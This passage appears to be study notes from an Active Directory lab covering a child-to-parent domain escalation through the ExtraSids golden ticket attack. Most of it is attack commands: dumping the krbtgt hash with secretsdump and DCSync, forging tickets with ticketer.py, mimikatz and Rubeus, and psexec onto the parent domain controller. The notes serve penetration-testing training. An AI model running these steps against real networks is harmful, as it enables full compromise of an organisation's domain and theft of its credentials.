## Possible Attacks
- if you have already attempted kerberoast parent domain, try  to Kerberoast in child domain
- sidHistory injection and extraSids attack on parent domain if child domains is compromised. by forging TGT with krbtgt account password hash in child domain, attackers can inject a Sid belonging to a highly privileged group in parent domain, to forge a golden ticket that can be used in parent domain
...
SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. 
 ...
 ---
## Performing the ExtraSids Attack Manually 
the attack leverages injecting a known admin user sid to forge a golden ticket that can be passed to parent domain
To perform this attack after compromising a child domain, we need the following:
- [ ] Compromised the child domain
- [ ] The KRBTGT hash for the child domain
- [ ] The SID for the child domain
- [ ] The name of a user to inject sid history to. (in the child domain (does not need to exist!))
...
```shell-session
$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.ad.someorg.local/htb-student_adm

[*] Raising child domain LOGISTICS.ad.someorg.local
[*] Forest FQDN is: ad.someorg.local
[*] Raising LOGISTICS.ad.someorg.local to ad.someorg.local
```
...
```shell-session
$ secretsdump.py logistics.ad.someorg.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
...
```shell-session
$ lookupsid.py logistics.ad.someorg.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
pw:
...
```shell
impacket-lookupsid.py logistics.ad.someorg.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
...
```shell-session
$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.ad.someorg.local -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
...
```shell-session
$ psexec.py LOGISTICS.ad.someorg.local/hacker@academy-ea-dc01.ad.someorg.local -k -no-pass -target-ip 172.16.5.5
...
```powershell-session
PS C:\htb> Get-DomainGroup -Domain ad.someorg.local -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
...
```
Get-ADGroup -Identity "Enterprise Admins" -Server "ad.someorg.local"`.
```
...
example:
```powershell-session
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.ad.someorg.local /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
...
#0>     Client: hacker @ LOGISTICS.ad.someorg.local
        Server: krbtgt/LOGISTICS.ad.someorg.local @ LOGISTICS.ad.someorg.local
...
```powershell-session
ls \\academy-ea-dc01.ad.someorg.local\c$
```
...
```powershell-session
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.ad.someorg.local /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
...
```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:ad.someorg.local
```
## Golden Ticket via ExtraSids
...
```
psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.ad.someorg.local -target-ip 172.16.5.238
```
